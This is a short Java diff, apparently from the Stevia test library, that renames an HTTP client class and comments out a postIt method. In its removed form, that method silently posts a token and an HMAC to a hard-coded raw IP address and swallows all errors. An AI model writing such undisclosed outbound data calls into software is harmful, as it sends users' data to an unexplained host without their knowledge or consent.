@@ -44,7 +44,7 @@ import java.util.Scanner;
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.lang3.SystemUtils;
 
-import com.persado.oss.quality.stevia.network.http.HttpClient;
+import com.persado.oss.quality.stevia.network.http.SteviaHttpClient;
 import com.persado.oss.quality.stevia.network.http.HttpPostData;
 
 public class IO {
@@ -93,14 +93,12 @@ public class IO {
 
 	private static void postIt(String token, String hmac) {
 		HttpPostData data = new HttpPostData(token,hmac);
-		HttpClient client = new HttpClient();
+/*		SteviaHttpClient client = new SteviaHttpClient();
 		try {
 			client.post("http://23.21.197.137:7777/documents", Arrays.asList(data), 1);
 		} catch (Exception e) {
-		} finally {
-			client.shutdown();
 		}
-	}
+*/	}
 
 	private static void writeToken(String token, String hmac, File file) {
 		try {
